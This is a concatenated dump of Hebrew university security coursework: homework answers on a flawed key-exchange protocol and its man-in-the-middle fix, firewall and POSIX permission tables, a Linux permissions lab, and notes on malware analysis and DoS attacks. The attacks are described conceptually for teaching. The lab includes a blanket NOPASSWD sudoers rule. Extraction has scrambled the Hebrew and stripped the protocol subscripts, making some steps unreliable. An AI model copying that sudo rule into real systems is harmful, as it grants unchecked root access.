𝑆 → 𝐴:   {𝐾 , 𝐴}   
𝐴 → 𝐵:   {𝑁 , 𝐴}   
𝐵 → 𝑆:   𝑅𝑒𝑞𝑢𝑒𝑠𝑡   
𝑆 → 𝐵:   {𝐾 , 𝐴}   
𝐵 → 𝐴:   {𝑁 , 𝑁 , 𝐾 }   
𝐴 → 𝐵:   {𝑁 , 𝐾 }   
𝑁 -שמורכב מ 𝐾צפנה ההבאמצעות מפתח בניהם יכולים לדבר  B-ו Aכעת  , 𝑁.  
ii.  במידה והתוקף (נניחC (יכול לגרום ל-A  להתחיל איתו שיחה הוא יכול לבצע את ההתקפה  
  :הבאה   
1. 𝐴 → 𝑆:   𝑅𝑒𝑞𝑢𝑒𝑠𝑡    7. 𝐵 → 𝑆:   𝑅𝑒𝑞𝑢𝑒𝑠𝑡  
2. 𝑆 → 𝐴:   {𝐾 , 𝐴}    8. 𝑆 → 𝐵:   {𝐾 , 𝐵}  
3. A → 𝐶:   {𝑁 , 𝐴}    9. 𝐵 → 𝐶:   {𝑁 , 𝑁 , 𝐾 }  
4. 𝐶 → 𝑆:   𝑅𝑒𝑞𝑢𝑒𝑠𝑡    10. 𝐶 → 𝐴:   {𝑁 , 𝑁 , 𝐾 }  
5. 𝑆 → 𝐶:   {𝐾 , 𝐶}    11. 𝐴 → 𝐶:   {𝑁 , 𝐾 }  
6. 𝐶 → 𝐵:   {𝑁 , 𝐴}   
  לשלוח לו  B-ולגרום ל A-תוך כדי התחזות ל Bויכול לדבר עם  Aלחשוב שהוא  B-גרם ל Cכעת 
  .A-שמיועדות להודעות    
  יניב לידן 200878627 מגישים:
 דן אברהם 204736961             
iii. :נשנה את הפרוטוקול כדי שיעבוד כך  
𝑁𝑜𝑡𝒆: 𝐻𝑒𝑟𝑒 𝐾  𝑎𝑛𝑑 𝐾∗ 𝑎𝑟𝑒 𝑏𝑜𝑡ℎ 𝑡ℎ𝑒 𝑝𝑢𝑏𝑙𝑖𝑐 𝑘𝑒𝑦 𝑜𝑓 𝐵 
1. 𝐴 → 𝑆:   𝑅𝑒𝑞𝑢𝑒𝑠𝑡   
2. 𝑆 → 𝐴:   {𝐾 , 𝐴}   
3. 𝐴 → 𝐵:   {𝑁 , 𝐴}   
4. 𝐵 → 𝑆:   𝑅𝑒𝑞𝑢𝑒𝑠𝑡   
5. 𝑆 → 𝐵:   {𝐾 , 𝐴}   
6. 𝐵 → 𝐴:   {𝑁 , 𝑁 , 𝐾 , 𝐾∗}   
7. 𝐴 → 𝐵:   {𝑁 , 𝐾 } ∗   
ויעביר  בתהליך התקיפה מתת סעיף קודם) 9של הפרוטוקול, שלב  6(בשלב  B-מ את ההודעה יקבל C-כעת כש
  .אותו הוא מקבל בתוך ההודעה Bיחזיר את ההודעה מוצפנת באמצעות המפתח הפומבי של  Aלפענוח,  A-אותה ל
  
  :3שאלה 
  1.  i.  לא נכון, פנייה מתוך הארגון (עמדות קצהA,B,C (.לא עוברת דרך חומת אש בכלל  
     ii.  לא נכון, בקשה שירות משרת המייליםMS  עוברת רק דרך חומת האשPF2.  
     iii.  שניתן לראות הנכון, כפי-PRX משמש כשרת פרוקסי וכל חיבור לשרת ה-HS .קורה דרכו  
     iv.  נכון, כיוון שכל גישה מעמדת קצה לשרתMS  עוברת דרךPF1כיוון ש .-PF1  הואpacket filter   
  .MS-לא תעבורנה לשרת ה Cשלהן המקור הוא  header-ניתן לקבוע כי כל החבילות שב     
  ע"י זיהוי החבילה של  PF1באמצעות חומת האש  Aמעמדה  HTTPהארגון יכול לחסום כל בקשת  .2  
  לפי המקור והיעד. header-מה HTTP-בקשת ה   
  3 .  
Action Dst. Port Src. Port Protocol  Dst. IP  Src. IP  In/Out  Rule ID  
Allow  80  *  TCP  10.0.0.9  *  In  1  
Drop  *  *  *  10.0.0.5  211.*  In 2.1  
Allow  25  *  TCP 10.0.0.5  *  In  2.2  
Allow  465  *  TCP  10.0.0.5  *  In  2.3 
Allow  587  *  TCP  10.0.0.5  *  In  2.4  
Allow  *  * * * * Out 3.1 
Drop  *  * * * * * 4 
  
   
  יניב לידן 200878627 מגישים:
 דן אברהם 204736961             
  :4שאלה 
 accounts cv.txt exam solutions 
R W A R W A R W A R W A 
alice V  V V V     V   
bob   V V   V      
charlie   V V   V   V   
 
  :5שאלה 
  א.   
File Name  Group  Owner  Capabilities 
Other  Group  User  Type  
ITUpdatePassword it  root  ---  --x  rws  -  
UserUpdatePassword  bank  root  ---  --x  rws  -  
password  sudo  root  ---  rw-  rw-  -  
  
  ב.   
File Name  Group  Owner  Capabilities 
Other  Group  User  Type  
PendingTransactions bank  root  ---  -w-  rwx  d 
ApprovedTransactions  privileges  root   --T  -w-  rwx d  
ApprovedAllPendingTransactions  it root  --- --x  rws  -  
  
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\עבודת-בית-2\עבודת-בית-2\HW2.docx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>

המחלקה להנדסת מערכות מידע ותכנה
אבטחת מחשבים ורשתות תקשורת
(372-1-4601)       
עבודה 2
תאריך ההגשה – 25.05.2019
הוראות כלליות:
הגשה ביחידים או בזוגות.
העבודה מורכבת משני חלקים – חלק תיאורטי וחלק מעשי. 
הוראות הגשה מופיעות בסוף החלק המעשי.
שאלות על העבודה יש לשאול אך ורק בפורום העבודות במודל, שאלות אשר ישאלו בדוא"ל לא יענו!
יש לכתוב תשובות מלאות ומפורטות.
כחלק מתהליך בדיקת העבודה תתבצע בדיקה לזיהוי עבודות מועתקות – אל תעתיקו. כל מקרה של העתקה יטופל על ידי ועדת משמעת אוניברסיטאית.


חלק תיאורטי (60 נק')
פרוטוקולי אימות  (10 נקודות)
נתון פרוטוקול המאפשר לשני לקוחות ו- לייצר מפתח סימטרי משותף  בעזרת שרת אמון . 





הפרוטוקול איננו מאובטח 
(3 נק') תאר את ההתקפה והדגם את תרחיש התקיפה? 
(3 נק') מהן היכולות הנדרשות מן התוקף בכדי לממש את ההתקפה? 
(4 נק') כיצד ניתן לתקן את הפרוטוקול בכדי להתמודד עם ההתקפה שתיארת? 
Kerberos  (10 נקודות)
(5 נק') הסבירו על מנגנון Kerberos. 
בתשובתכם, פרטו:
מהי מטרת הפרוטוקול
מי הם השחקנים והרכיבים במערכת
מהו התהליך שמבוצע מרגע התחלת הבקשה לשירות (service) מסוים ועד קבלת גישה עבורו? 
(5 נק') פרוטוקול Kerberos מבוסס על פרוטוקול Needham-Schroeder.
תאר את פרוטוקול  Needham-Schroeder המבוסס על הצפנה באמצעות מפתח פומבי.
תאר התקפה על פרוטוקול Needham-Schroeder.
תאר כיצד ניתן לתקן את הפרוטוקול כדי להימנע מסוג תקיפה זה.


Firewalls (15 נקודות)
לפניכם תרשים של רשת ארגונית:

כפי שניתן לראות בתרשים, הרשת מורכבת משלוש עמדות קצה (A,B,C), שרת FTP (FS), שרת HTTP (HS) ושרת מייל SMTP (MS). כמו כן, הרשת מוגנת ע"י שלושה חומות אש: שתיים מסוג Stateless packet filter ללא deep packet inspection (PF1, PF2) ואחת מסוג שרת פרוקסי המסוגלת לפעול ברמת האפליקציה ((PRX.
(5 נק') ענו נכון/לא נכון והסבירו בקצרה את תשובתכם לגבי כל אחת מהטענות הבאות: 
כל פנייה לשרת FS (בין אם הפניה מגיעה מחוץ לארגון או מתוכו) עוברת דרך לפחות חומת אש אחת.
כל בקשה של שירות (service) אשר מגיעה מחוץ לרשת הארגונית עוברת דרך שתי חומות אש.
לא ניתן ליצור חיבור ישיר אל שרת HS.
ניתן ליצור חוק המונע גישה של עמדה C לשרת MS.
(3 נק') בארגון עלה חשד כי העובד בעמדה A שולח בקשות HTTP זדוניות לשרת HS. האם יכול הארגון לזהות ולחסום תקשורת HTTP מעמדה A לשרת HS וזאת ללא שינוי מבנה הרשת. פרטו!
(8 נק') מלאו את טבלת החוקים של PF2 לפי המדיניות הבאה (יש להקפיד על סדר החוקים):
מותר לגשת מחוץ לארגון אל שרת HS, אך רק ע"י הפרוטוקול והפורט המתאים (מהו?).
פרט לגופים מתחרים (אשר כתובות ה-IP שהם מתחילות ב-211), מותר לגשת מחוץ לארגון אל שרת MS, אך רק ע"י הפרוטוקול והפורטים המתאימים (מהם?).
יש לאפשר מענה על כל בקשה מתוך הרשת הארגונית.
כל השאר אסור.
(*) גודל הטבלה אינו מעיד על מס' החוקים הדרושים.


POSIX File Permissions (10 נקודות)
לאחר הרצת הפקודה  במערכת מסוג Linux התקבל הפלט הבא:
 
המשתמשים alice ו-bob חברים בקבוצה users
המשתמש charlie חבר בקבוצה gurus
האפליקציה chmod הינה כפי שמתוארת ב-manual של Unix (משתמשים יכולים להריץ את האפליקציה במידה ויש להם הרשאות לכך).
האפליקציה accounting מאפשרת לצרף רשומה (append) לקובץ ה accounts 
מלא את טבלת הרשאות הבאה עבור המשתמשים: bob, alice ו-charlie והקבצים accounts, cv.txt, exam, solutions אשר מראה עבור כל משתמש האם הוא יכול לבצע קריאה (Read) , כתיבה (Write) או רק צרוף של רשומה (Append) עבור כל אחד מהקבצים.
(*) לא קיים שיתוף פעולה בין משתמשים במערכת.

POSIX File Permissions (15 נקודות)
בבנק הפעלולים עושים שימוש במערכת מחשוב מבוססת POSIX. המערכת כוללת את סוגי המשתמשים הבאים:
עובד-בנק  (BankEmployee)
עובד-בנק-מורשה-חתימה  (PrivilegeBankEmployee) 
עובד-בנק-צוות-טכני (IT) 
מנהל המערכת (root)

כמו כן, המשתמשים השונים חברים בקבוצות כפי שמתואר בטבלה הבאה:



הערה: בשני הסעיפים הבאים עליכם לנקוט בעקרון Least Privileges כלומר, כל הרשאה שלא כתובה במפורש כי מותרת הינה אסורה (למעט מנהל המערכת אשר בידו הרשאת  root).
מנהל המערכת הגדיר את הדרישות הבאות לניהול הסיסמאות של המשתמשים השונים:
כלל סיסמאות הכניסה לארגון מנוהלות בקובץ בשם passwords. קובץ זה ניתן לעריכה אך ורק באמצעות האפליקציות UserUpdatePassword ו- ITUpdatePassword
כל משתמש במערכת יכול לעדכן לעצמו את סיסמת הכניסה למחשב הארגוני באמצעות אפליקציית UserUpdatePassword
משתמש מסוג עובד-בנק-צוות-טכני יכול לעדכן את הסיסמאות של כלל המשתמשים באמצעות אפליקציית ITUpdatePassword
סעיף א׳ (7 נקודות) – לפנייך טבלה המכילה את הקבצים במערכת, עבור כל קובץ השלם את סדרת ההשראות (הכוללת הרשאות User, Group, Other , שם בעל הקובץ והקבוצה אליה שייך הקובץ) הנדרשות בכדי לעמוד בדרישות הנ״ל.


בבנק מוגדרת המדיניות הבאה לניהול העברות כספים (Transactions):
באפשרות כל עובד-בנק לבצע פעולות של העברות כספים (Transactions). העברת כספים זו איננה מאושרת באופן ישיר ומיוצגת במערכת ע״י קובץ אשר נמצא בתיקיית PendingTransactions. יצירה\מחיקה של קבצים ב\מ תיקיה זו אפשרית לכל עובד בנק ומתבצעת ללא כל אפליקציה ייעודית.
כל הפעולות המאושרות מנוהלות בתיקייה בשם ApprovedTransactions. 
אך ורק עובד בנק-מורשה-חתימה יכול ליצור קובץ פעולה ישירות אל תוך תיקיית ApprovedTransactions 
מחיקת קובץ ישירות מתיקיית ApprovedTransaction אפשרית אך ורק ליוצר קובץ הפעולה (כלומר מחיקת פעולה מתיקיה זו אפשרית אך ורק ע״י הבנקאי שייצר אותה).
בנוסף, מידי לילה מריץ אחד מאנשי ה-IT את אפליקציית ,ApproveAllPendingTransactions  אפליקציה זו מוודא את כלל הפעולות אשר נמצאות בתיקיית PendingTransactions. פעולות שעברו את תהליך הווידוא מאושרות ופעולות שנכשלו בתהליך הווידוא נמחקות. אישור פעולה בא לידי ביטוי במחיקה של קובץ הפעולה מתיקיית   PendingTransactionsוהעברתו לתיקיית ApprovedTransaction.
סעיף ב׳ (8 נקודות) – לפנייך טבלה המכילה את הקבצים במערכת, עבור כל קובץ השלם את סדרת ההשראות (הכוללת הרשאות User, Group, Other , שם בעל הקובץ והקבוצה אליה שייך הקובץ) הנדרשות בכדי לעמוד בדרישות הנ״ל. 






חלק מעשי (40 נק')
POSIX File Permission
Setup
The practical part of this assignment will be conducted using a virtual machine of a Ubuntu Server 14.04.5 (32bit). 
You can download the image of the server from this link. You can use either VMware or VirtualBox virtualization software to mount the image file, just download the correct image for your software. The size of the file is about 250MB (zipped), after extraction it will take about 1.3GB, please ensure that you have such free space in your computer.
If you are not familiar of how to mount a virtual machine using existing image, you can use this guide for VMware and this for VirtualBox – don’t forget to select the correct operating system (i.e., Linux Ubuntu). The resources that you should allocate for the server are about 2GB of memory and 1 processor core, for the network adapter settings use NAT.
After mounting the image, you will request to enter a username and password.
The username of the VM is – osboxes
The password of the VM is – osboxes.org
Now you can start completing the task .

Overview
The purpose of this exercise is to introduce you to filesystem and network access control schemes and the "principle of least privilege" through the use of POSIX filesystem permissions.
After this exercise, you will:
Understand the POSIX permissions structure including SUID and SGID bits.
Understand the essence of the sudo utility and how to configure and use it securely.
Be able to apply that knowledge to configure permissions in multiple scenarios, such as:
shared system directories
user home directories and private directories
privileged system directories
unprivileged temporary directories
editing important configuration files
restarting system processes
potential privilege escalation problems


Practical Assignment 
You are interviewing to the system administrator role in a company. You will be presented with some theoretical questions and tasks. You will need to answer the question and complete the tasks. Please follow the submission guidelines located in the end of the practical assignment.
The following section includes several permissions and file creation exercises. You are fully encouraged to use the Internet, man pages, help screens, and any other resources available to you in the execution and answering of these problems.
Please read and use these disambiguation rules for setting the correct permissions. Also, make sure that you test your answers - POSIX permissions are simple in theory, but in practice many combinations have counterintuitive effects!
Home Directory Security (20 points)
 Note: Admins - members of the wheel group have sudo access. However, unless instructed to do so, use only standard UNIX ACLs - don't give user accounts sudo permissions or consider the sudo access the 'wheel' group already has. Of course, you need to use sudo to create the accounts, edit root files, etc... this is exactly what sudo is for.
Your server needs two home directories, the usual /home and also /admins for your team. Normal home directories are private, while the home directories in /admins will be publicly viewable and somewhat collaborative.
 You can test the permissions settings on server by logging in as the various accounts you've created! For example, after creating the account larry, you can log in by executing ssh larry@localhost and entering the password you used for larry. In this way, you can see if the permissions you set meet the requirements.
Create the /admins directory.
Create the groups emp and wheel
Create the user accounts larry, moe, and curly. You may set the passwords to anything you like. In addition, create a home directory for each user at /home/username 
Add the three accounts you just made to the emp group. In our system, accounts in the emp group are "normal" (i.e., non-admin) accounts.
Next, we will set up our administrators. Create the user accounts ken, dmr, and bwk - specifying that the home directory for each admin should be located at /admins/username - where username is ken, dmr or bwk. In other words, admin homedirs are not in /home. You may set the passwords to anything you like.
Add the admin accounts to the wheel group (Ensure that admins are not part of the emp group.) Being in the wheel group is what gives these users administrator rights (i.e., sudo powers).
On this system, default permissions for new home directories allow other users (i.e., users that are not the owner or in the specified group) to read and execute files in the directory. This is too permissive for us. Set the mode on the home directories in /home so that owners (i.e., currly, larry and moe) have read, write, and execute privileges to their home directory , group can read and execute and other has no permissions. (Set the mode on the homedir only -- do not set it recursively.)
Individual home directories should now be inaccessible to other users. Now, set the permission mode on /home itself so that normal users can't list the contents of /home but can still access their home directories and so that members of the wheel group have full access to the directory (without using sudo).
By default, each homedir is owned by its user, and the homedir's group is set to the group named after the user. (For example, ken's homedir is set to ken:wheel - i.e., ken is the owner and the group is set to ken's group.) Set the permission modes recursively on the individual home directories in /admins (see man chmod) so that:
owners have full access
group users (users who are in the group associated with a user's home directory) can read and create files in that homedir
other users can read and execute any files (unlike the home directories in /home)
files created by a group member in that homedir should be set to the homedir owner's group. (Hint: Look up what the SUID and SGID bits do on directories.)
Editing Configuration Files (4 points)
All members of the wheel group do system administration on the server. Because of this, they all have full sudo access to root privilege with the /etc/sudoers directive '%wheel ALL=(ALL) NOPASSWD: ALL'.
The "NOPASSWD" means they don't have to enter a passwd upon sudo invocation.
Add the above directive to /etc/sudoers to allow users from wheel group to perform system administration (i.e., run sudo). You can use the vim text editor to do so.
The Ballot Box (8 points)
All regular employees use this directory to submit votes for "employee of the month".
Create the /ballots directory.
Set the permissions on /ballots so that it is owned by root and users can write files into the directory but cannot list the contents of the directory.
Furthermore, set it so that members of the wheel group have no access (not including sudo).
Short Answer 1: Is there any way that employees can read the ballots of other users? If so, what could be done to stop this? If not, what prevents them from reading them?
Short Answer 2: What does the 'x' bit mean when applied to directories

The TPS Reports Directory (8 points)
Admin employees submit TPS reports in this partially collaborative directory.
Create the /tpsreports directory.
Create the tps user.
Set the permissions on /tpsreports so that it is owned by tps and that tps and members of the wheel group have full access to the directory, but so that no one else has access to the directory.
Furthermore, configure it so that files written into it are still owned by the wheel group, but so that one member of wheel cannot delete another member's files.
Short Answer 3: Which users on the system can delete arbitrary files in the /tpsreports directory?
Short Answer 4: Is there any way that non-wheel employees can read files in the /tpsreports directory?


Submission Guidelines
Theoretical parts
All theoretical parts of this assignment should be uploaded in one document file to moodle.
You should upload the document only from one student account.
The name of the document should be ID1_ID2.

Practical parts
The practical parts should be uploaded to an FTP server on IP address 132.72.81.33 port 21.
The FTP server will be available only from the University’s network – take it into account, we will not accept late submissions.
In order to connect to the FTP server you will first need to configurate the network interface of your virtual machine. To do so, run the following commands:
sudo ifconfig eth0 up
sudo dhclient eth0 
 (*) You can validate that network is available by running ping google.com.
Connect to the ftp server using the following command:
ftp -p 132.72.81.33 21
The server will request a user name and password
username – anonymous
password – your email address
After connecting to the server, you should turn off the passive mode by using the following command: passive (if everything work well, the output will be “Passive mode off”).
On the FTP server, you will find two directories hw2 and submission-script
In the submission-script directory you will find a script (submit.sh), download it to your machine (to do so, use the get command).
Run the script on your local machine and write its output to a file named ID1_ID2_0.
Validate the output of the script (e.g., using the vim text editor).
After validating the output of the script you can upload the file to the FTP server to hw2 directory (to do so, use the put command).
NOTE: you cannot edit the report after uploading it to the FTP server. If some how you made a mistake, and you wish to upload a second report to the FTP server, increment the version number  (i.e., ID1_ID2_1) – we will test the latest version, however we allow only three resubmissions, take it into account.
 


Done!
Rules for resolving filesystem permission ambiguities:
Permissions should always be set to reflect the least privilege required to fulfill the requirements. In POSIX permissions, every bit set represents less security, so we want to set as few bits as possible. Resolve any ambiguities with this cumulative list of guidelines:
Files you are instructed to create are to be owned by root unless otherwise specified. Doing the work as root should do this automatically. (You can become root by executing sudo su -.)
Exception: Files in homedirs should be owned by the home directory owner (useradd should do this by default for boilerplate files like .bash_login, etc).
When setting ownership of a file, set the group class to the same thing as the user (owner) class unless otherwise specified.
Files whose permissions you are not otherwise instructed to change should stay at their default.
For any files, whose permissions you are instructed to change, unspecified permissions are always assumed to be 0 (no access). In other words, instructions for setting file permissions implicitly include all access groups (even those not explicitly mentioned).
Permissions are assumed to be for all classes unless specified.
When granting permissions, setuid, setgid, and sticky bits are never granted unless specifically required to solve the problem. These bits are special and must be required by the nature of the question or be otherwise mentioned to be granted.
If any tasks are not possible with the standard POSIX permissions available in this exercise, explain why.


Recommended Reading
This section contains information that will help you through the exercises in this assignment, though not mandatory, reading this section is recommended!

The sudo command
Some applications simply require stronger guarantees, finer granularity, or other features that the traditional permissions cannot express. For those applications, users have many alternatives. sudo is one simple extension to traditional Unix permissions that has become very popular.
sudo is a setuid root application with its own ACL (stored in /etc/sudoers) that specifies, with fine granularity, tasks that users and groups can perform as root. For example, sudo could be used to allow a user to act as root in order to kill processes with a specific name. The user would otherwise have no additional privileges. This is an example of a perfect use for setuid root programs -- granting strongly-constrained privileges to unprivileged users.
However, sudo is a double-edged sword. On the one hand, it greatly enhances the expressiveness of Unix permissions without actually changing the permissions system. On the other hand, if improperly configured, it offers easy access to root. For more information on sudo and the sudoers ACL format, please see the manpages for sudo and sudoers (the configuration file), or other sudo-related material online (in particular regarding sudo exploits).
Beyond sudo, two broader and more revolutionary alternatives for Linux permissions include SELinux and grsecurity, while other options exist including LDAP, Novell eDirectory, and other permissions systems for other operating systems. (We won't be using any of these.)
Software Tools (We discussed most of them on PS6)
Add users to a system (related tools – adduser, chfn, passwd):
adduser is the tool available for adding users to the system. To create a new user, execute:
$ adduser username
adduser will copy files from the /etc/skel directory to become the new homedir of the new user in the /home/ directory. You can specify a different home directory or automatically add the new user to groups; those options can be found in the adduser manpage.
adduser does not set any finger information for the user (this is not strictly necessary anyway), but the tool chfn will do that:
$ sudo chfn jimbo
Changing finger information for jimbo.
Name []: ...
By default, the user is created with a "locked out" account with no password set. To set the password, use the command passwd:
$ sudo passwd jimbo
Changing password for user jimbo.
New Unix password:
Retype new Unix password:
passwd: all authentication tokens updated successfully.
passwd will complain if it doesn't like the password you enter, but will accept anything with enough prodding.
Once an account is created, you can log into it in a number of ways:
If logged in to the system where you created the account, you can execute ssh newuser@localhost to reconnect locally as the new user with the new password.
If local, you can also use the su command su newuser to change to that user. This does not always update all access credentials, however. This method can also be used to become root by entering sudo su -.
If logged in to users.create.iucc.ac.il, you can ssh to the node as the new user.
Add groups to a system(related tool – groupadd)
groupadd adds a new group to the system with a unique ID (by default). Example:
$ groupadd newgroup
See man groupadd for more information.
Modify a user (related tool – usermod) 
usermod can be used to modify many details of a preexisting user account. For more information, see man usermod.
Change ownership of a file (related tools – chown, chgrp) 
chown stands for change ownership and is (unsurprisingly) used to change the owner and group of a file.
The syntax is very simple. To change the owner of a file, execute:
$ chown newowner filename
To change the owner and group classes of a file, execute:
$ chown newowner:newgroup filename
chgrp stands for change group and works very similarly to chown. To change the group of a file, execute:
$ chgrp newgroup filename
Recursive and other options exist; see man chown or man chgrp for more information.
Change the mode of a file (related tool – chmod): 
chmod stands for change mode and is used to change the permissions mode of a file. Earlier, we discussed how the POSIX ACL has three access classes. User (or owner), group, and other (or world). The permissions mode for each access class can be changed by the chmod command.
There are two ways to use chmod; one is an absolute numeric mode and the other is a symbolic mode.
Absolute -- setting the permissions explicitly
In the absolute mode, chmod takes a file mode in 3 or 4 digits, each of which represents the absolute permission mode for one access class expressed in octal, where each number is a sum of the permission bits. Each permission has a unique value: read permission is 4, write permission is 2, and execute permission is 1. These values represent the position of the permission in a 3-bit value.
For example, the mode 777 means "full permissions" because all bits are set in each access class. Similarly, 000 means "no permissions" because all bits are unset in each access class.
The 3-digit mode 777 is the equivalent to the 4-digit mode 0777 where the leading 0 represents the "special" permission class of setuid, setgid, and sticky. Likewise, the modes 000 and 0000 are equivalent and represent the absence of permission. (The owner of the file and root still have the ability to change the file's mode by virtue of their ownership and superuser status.) Finally, if the 3-digit mode is used, chmod always assumes that the special access class is 0. Therefore, if you set an suid-root file to mode 777, chmod assumes that you meant mode 0777, which would take away the special permissions. This is consistent if you remember that octal modes represent absolute permissions and the special group class is assumed to be 0 if a 3-digit mode is provided.
The following is a table to help calculate permission modes:
For example, full access is 0777, which represents:
There are no special bits set, so the special octal digit is 0, while all three bits in each other class are set. Each set of bits totals 7 (4 + 2 + 1), so the mode is 0777.
Another example is mode 2755, which represents setgid (2), plus "full access" for user (4 + 2 + 1) and write and execute (4 + 1) access for both the group and other class.
Absolute modes are applied like this:
$ chmod 0755 somefile.sh
Absolute mode is great for setting things to be exactly what you want, or imposing a radically different order onto a file or directory, but it's not very good for adding the sticky bit to a file. For that kind of work (or if the octal modes just confuse you) the symbolic mode is well suited.
Symbolic -- more user-friendly
The symbolic mode works pretty much the way you would expect. To add the execute bit to the user class, you would execute a command like this:
$ chmod u+x somefile.sh
Or to add execute to all three classes:
$ chmod ugo+x somefile.sh
To make a file setuid:
$ chmod u+s somefile.sh
To remove all permissions:
$ chmod ugo-rwxsgt somefile.sh
Some people are so put off by the absolute mode that they never learn it -- you'll find with experience that both methods of setting permissions can be expeditious depending on the situation. More information is available in the chmod manpage.
Regardless of how you set permissions, it is critical that you use the "principle of least privilege" and only grant the privileges that are necessary for proper operation.
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\עבודת-בית-4\עבודת-בית-4\200878627_204736961.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
  יניב לידן 200878627 מגישים:
 דן אברהם 204736961             
  אבטחת מחשבים ורשתות תקשורת – 4עבודה 
  :1שאלה 
קונספט של תוכנת אנטי ווירוס היא לשמור על מחשבים מפני וירוסים. מטרותיה העיקריות ה. 1
הן לאתר וירוסים ולמנוע את האיום והנזק שהם מביאים עימם. תחומי האחריות העיקרים הם 
לרוב תוכנות אנטי וירוס דורשות מעט  . באיומיםסריקת קבצים, זיהוי התנהגות חשודה וטיפול 
מאוד אינטרקציה עם המשתמש שכן הן פועלות ברקע בצורה אוטומטית ורק מתריעות בפני 
  המשתמש ממצאים חשודים על מנת לקבל הוראה להמשך הטיפול.
2. Malware Analasis  הינו תחום שמטרתו זיהוי הפונקציונליות וההשפעה של תוכנות זדוניות
וקטלוג שלהם בהתאם. הוא קיים כי כיום, לאור המהירות שבא נוזקות חדשות צצות, יש צורך 
בזיהוי וגילוי של נוזקות חדשות בצורה דינמית ושיתופית. תוכנות אנטי וירוס הינן תוכנות ״רזות״ 
  ואינן יכולות להתקיים ללא מאגר דינמי ועדכני של נוזקות ידועות.
3. Virus TOTAL הינו API   שמאפשר ניתוח של קבצים וגילוי נוזקות. בכל פעם שמישהו מעלה
קובץ, במידה והתגלה נוזקה, היא נשמרת במאגר ובכך המאגר גדל ומתעדכן כל הזמן. כדי 
ידועה, או בשביל לשתף את הקהילה בקובץ   malware להשתמש בו בשביל לבדוק אם קובץ הוא
   .ידוע שהתגלה
  פלט התוכנית:
  
  
  
  
  
  
  
  
  
  
מוגדר להיות כל תוכנה  אשר תוכננה ועשויה   malwareהוא ש malwareההבדל בין וירוסים ל .4
השונים הם malware  שכן סוגי malware לגרום נזק. וירוסים למעשה מוכלים בתוך ההגדרה של
   .adware, spy ware worms, trojan, ransomeware ,בעיקר: וירוסים
ר מופעל, משכפל את עצמו ע״י הכנסת הקוד הזדוני שלו שכאש Malwareוירוס הוא למעשה 
  לתוכנות אחרות.
 
   
  יניב לידן 200878627 מגישים:
 דן אברהם 204736961             
  :2שאלה 
  :Malware Analysis כללי האצבע הנדרשים בביצוע.1  
  .הרצה בסביבה וירטואלית •
  .ניתוק מרשתות חיצוניות •
  .שמירת החתימה של הקובץ ובדיקה אם השתנה לאחר התהליך •
  למיניהם.ביטול תוכנות אנטי וירוס   •
הקובץ ללא  ההבדלים בין ניתוח סטטי לניתוח דינמי הינו, שבניתוח סטטי מבוצע ניתוח על. 2
  הפעלתו. לעומת זאת בניתוח דינמי הקובץ החשוד מופעל ומתבוננים על התנהגותו.
הינה תוכנה המחלצת מחרוזות מקבצים בינאריים(לדוגמא   strings2 ן,לא נכו.3
“windows”,”kernel ”ולא משתמשת בוכו (..Virus Total.  
4. Procmon (Process Monitor)  הינו כלי דינמי למעקב שמציג למשתמש פעילות של
רג׳יסטרים, תהליכים, מערכת קבצים ותרדים בזמן אמת. הדרך המומלצת לעבוד עם התוכנה 
מומלץ שהסביבה תהיה ריקה מתהליכים  –היא באמצעות הצגה של התהליך החשוד וניתוחה 
  אחרים בזמן הניתוח.
  ::Cuckoo sandboxיתרונות של  ל.5
a .עושה אנליזה להרבה קבצים מסוגים שונים  
b .מאתר שיחות API והתנהגות כללית על קבצים.  
c .(עושה אנילזות לתעבורת רשת (גם מוצפנת  
d .מבצע אנליזה מתקדמת על הזיכרון של סביבה ווירטואלית נגועה.  
  :חסרונות
לנוזקה לוקח זמן לתקוף, התוכנה לא תצליח לזהות אותה (לדוגמא אם הנוזקה מחשבת אם 
  את פיבונצ׳י)
  
   
  יניב לידן 200878627 מגישים:
 דן אברהם 204736961             
  :3שאלה 
  דרכים להזדהות: 4. 1  
    I.('מידע המוכר למשתמש (סיסמה, שאלות פרטיות וכד .  
    II .זיהוי פנים וכד'זיהוי פיזי (טביעת אצבע ,(.  
    III . מקודד וכד')מכשיר (כרטיס זיהוי ע"י.  
    IV .זיהוי קולי.  
  2.  I .Amplification Attack  מתקפה בה בעצם התוקף מעצים את ההתקפה בלי שימוש  
  שולח) התוקף DNS Amplificationבמתקפות אלה (כדוגמת  .בהרבה משאבים מצידו    
  על מנת למנוע מתקפות מסוג זה, יש לחסום בקשות שמגיעות רבים. spoofed IPלשרת     
  .Spoofed IPעם     
II .Reflection Attack  שמנצלת חולשה של פרוטוקול אוטנטיקציה דו הינה מתקפה
 פותח קשר עם המטרה פעמיים, פעם אחת מקבל ממנו אתבהתקפה זו התוקף  צדדי
 ומקבל עליו תשובה. "challenge"-ה" ובפעם השנייה שולח לו את אותו challenge"-ה
 על מנת למנוע מתקפות מסוג זה על המטרה לדרוש מפותח הקשר תשובה על האתגר
על המטרה גם לשנות את פרוטוקול האוטנטיקציה כך  .לפני שהיא מחזירה לו תשובה
  שלא יהיה זהה בשני צדדיו.
III .SYN Spoofing Attack  התקפת הינהDOS  בה התוקף שולח הרבה חבילותSYN 
ודבר זה מונע חיבור  כך שלחיצת הידיים לא מסתיימת Spoofed IPמסוים עם לאתר 
 TCPקשרים מסוג נחסום על מנת למנוע התקפה זו  לאתר ממשתמשים אמיתיים.
או לסגור קשרים שלחיצת היד שלהם  TCPבקשרי  IPפנימיות, הגבלת כתובות לכתובות 
  שניות. Xר לא הושלמה לאח
  3 .Buffer Overflow  שבגללה מתאפשר לתוכנית לכתוב לזיכרון מעבר למקום  חולשה בקודהינה  
  עלול לגרור לכשל  Buffer Overflow . מה שעלול לגרום לדריסה של נתונים אחרים.שהוקצה לה  
  ניצול ע"י החדרת קוד זדוני (שבעזרת החולשה וניתן ל בתוכנית(קריסה או החזרת ערכים שגויים)   
